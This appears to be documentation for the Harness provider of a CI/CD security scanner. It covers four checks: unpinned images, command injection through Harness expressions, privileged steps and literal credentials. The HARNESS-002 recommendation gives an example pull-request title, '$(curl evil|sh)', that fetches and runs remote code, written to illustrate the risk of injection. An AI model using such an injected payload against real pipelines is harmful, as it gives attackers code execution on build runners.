# Harness CI/CD provider

Parses Harness pipeline YAML (the Git Experience / pipeline-as-code
form) on disk. Harness has no canonical filename, so the loader globs
``*.yml`` / ``*.yaml`` and keeps the documents whose top-level key is
``pipeline:`` (its discriminator); a ``template:`` document or
unrelated YAML in the same directory is skipped. A pipeline nests
steps several levels deep (``stages`` -> ``stage.spec.execution.steps``
-> ``step`` / ``parallel`` / ``stepGroup``); the rule pack flattens
all of that and scans every leaf step across CI and CD stages.

## Producer workflow

```bash
# --harness-path is auto-detected when a .harness/ directory exists at cwd.
pipeline_check --pipeline harness

# ...or pass it explicitly (a file or a directory of pipelines).
pipeline_check --pipeline harness --harness-path .harness/

pipeline_check --pipeline harness --harness-path pipelines/build.yaml
```

All other flags (`--output`, `--severity-threshold`, `--checks`,
`--standard`, ...) behave the same as with the other providers.

### Harness-specific checks

- **HARNESS-002**, Harness substitutes a ``<+...>`` expression's text
  into a step ``command`` *before* the shell runs it, so an
  attacker-controllable expression (``<+codebase.prTitle>``,
  ``<+codebase.commitMessage>``, a branch / tag name, or any
  ``<+trigger.*>`` / ``<+eventPayload.*>`` value) is a command-injection
  primitive. ``<+codebase.commitSha>`` / ``<+codebase.repoUrl>`` are
  excluded (not injectable text). Bind the value to an ``envVariables``
  entry and quote it (``"$PR_TITLE"``) to clear the finding. Same model
  as GHA-002 / GL-002 / DR-003 in this catalog.

## What it covers

4 checks · 0 have an autofix patch (``--fix``).

| Check | Title | Severity | Fix |
|-------|-------|----------|-----|
| [HARNESS-001](#harness-001) | Step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-002](#harness-002) | Untrusted Harness expression interpolated into a step command | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-003](#harness-003) | Step runs with privileged: true | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-004](#harness-004) | Literal credential in a pipeline / stage variable | <span class="pg-sev pg-sev--critical">CRITICAL</span> |  |

---

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-001: Step image not pinned to a digest { #harness-001 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-IMMUTABLE</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span>
</div>

Detection mirrors the DR-001 / GL-001 / CC-003 family over Harness's nested step model: every ``Run`` / ``Plugin`` / ``Background`` (and any custom) step that declares a ``spec.image`` whose ref does not end in ``@sha256:<64 hex>`` fires, across CI and CD stages and through ``parallel`` / ``stepGroup`` nesting. Steps with no ``spec.image`` (built-in steps like ``BuildAndPushDockerRegistry`` / ``RestoreCacheS3``) pass-by-default. ``:latest`` and missing-tag refs emit the strongest message; a version tag (``node:18.19.0``) still fires but is a one-line digest swap.

**Known false-positive modes**

- An image built earlier in the same pipeline and referenced by a deliberately-floating internal tag can't always be digest-pinned. Suppress via an ignore-file scoped to that step; the floating-tag risk still applies to every public-registry pull.

<div class="pg-rule__rec" markdown>

**Recommended action**

Pin every step ``image:`` to ``@sha256:<digest>``. Harness resolves the image ref at run time, so a tag like ``node:18`` resolves against whatever the registry currently serves, and a compromised registry (or a moved tag) can swap content under a fixed tag. Capture the digest once with ``crane digest node:18`` (or ``docker buildx imagetools inspect node:18``) and bump it deliberately when the upstream version moves.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-002: Untrusted Harness expression interpolated into a step command { #harness-002 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--cwe">CWE-94</span> <span class="pg-tag pg-tag--cwe">CWE-78</span>
</div>

The Harness analog of GHA-002 / GL-002 script injection. Fires when a step's ``spec.command`` text contains a ``<+...>`` expression that resolves to outside-contributor input: the ``codebase`` identity / ref / title / message fields (``gitUser``, ``branch``, ``sourceBranch``, ``targetBranch``, ``tag``, ``prTitle``, ``commitMessage``, ...) or the whole ``trigger.`` / ``eventPayload.`` webhook context. ``<+codebase.commitSha>`` / ``<+codebase.repoUrl>`` are excluded (not injectable text). Detection is purely on the expression namespace, so it does not depend on the trigger type; binding the value to an env var and quoting it clears the finding.

<div class="pg-rule__rec" markdown>

**Recommended action**

Never paste an attacker-controllable Harness expression (``<+codebase.prTitle>``, ``<+codebase.commitMessage>``, a branch / tag name, or any ``<+trigger.*>`` / ``<+eventPayload.*>`` value) straight into a ``Run`` step ``command``. Harness substitutes the expression's text into the script before the shell runs it, so a pull request titled ``$(curl evil|sh)`` executes on your runner. Pass the value through an environment variable instead (``envVariables: { PR_TITLE: <+codebase.prTitle> }`` then use ``"$PR_TITLE"`` quoted in the script), which makes the shell treat it as data, not code.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-003: Step runs with privileged: true { #harness-003 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-5</span> <span class="pg-tag pg-tag--esf">ESF-D-RUNTIME-HARDENING</span> <span class="pg-tag pg-tag--esf">ESF-D-LEAST-PRIV</span> <span class="pg-tag pg-tag--cwe">CWE-269</span> <span class="pg-tag pg-tag--cwe">CWE-250</span>
</div>

Harness CI ``Run`` / ``Background`` steps accept a ``spec.privileged: true`` flag that maps to ``docker run --privileged`` on the build pod / VM. The rule fires on any step (across CI and CD stages, through ``parallel`` / ``stepGroup`` nesting) whose ``spec.privileged`` is truthy. Same model as DR-002 / BK-006 in this catalog.

<div class="pg-rule__rec" markdown>

**Recommended action**

Drop ``privileged: true`` from the step. The flag removes the container's syscall and capability boundary, giving the step kernel-level access to the build host. Most workloads that reach for it are Docker-in-Docker builds that can use a rootless alternative (``kaniko``, ``buildah --isolation=chroot``, BuildKit rootless) instead. If a genuine syscall is needed, scope it down with explicit added capabilities on an isolated build-infra pool rather than blanket privileged mode.

</div>

</div>

<div class="pg-rule pg-rule--critical" markdown>

## HARNESS-004: Literal credential in a pipeline / stage variable { #harness-004 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-7</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-798</span> <span class="pg-tag pg-tag--cwe">CWE-321</span>
</div>

Fires on a pipeline-level or stage-level ``variables:`` entry whose ``value`` is a credential-shaped literal (matched by the shared secret-shape catalog, ``find_secret_values``) rather than a ``<+secrets.getValue(...)>`` expression. ``type: Secret`` variables and any ``<+...>`` expression value are skipped (those are managed references, not literals); empty values are ignored. The value is redacted in the finding. Same value-shape model as the literal-secret rules across the other providers (DR-004 / BK-002 / TKN-005).

<div class="pg-rule__rec" markdown>

**Recommended action**

Move the credential into a Harness secret and reference it as an expression instead of a literal: declare the variable with ``type: Secret`` and a value of ``<+secrets.getValue("my_secret")>`` (or store it in the built-in / a connected secret manager). Harness masks secret-expression values in logs but does not mask a literal pasted into a ``type: String`` variable, so the token ends up in the pipeline definition and the run logs indefinitely. Rotate any credential already committed this way.

</div>

</div>

---

## Adding a new Harness CI/CD check

1. Create a new module at
   `pipeline_check/core/checks/harness/rules/NNN_<name>.py`
   exporting a top-level `RULE = Rule(...)` and a `check(path, doc) -> Finding`
   function. The orchestrator auto-discovers `RULE` and calls `check`
   with the parsed YAML document.
2. Add a mapping for the new ID in
   `pipeline_check/core/standards/data/owasp_cicd_top_10.py` (and any
   other standard that applies).
3. Drop unsafe/safe snippets at
   `tests/fixtures/per_check/harness/-NNN.{unsafe,safe}.yml`
   and add a `CheckCase` entry in
   `tests/test_per_check_real_examples.py::CASES`.
4. Regenerate this doc:

   ```bash
   python scripts/gen_provider_docs.py harness
   ```
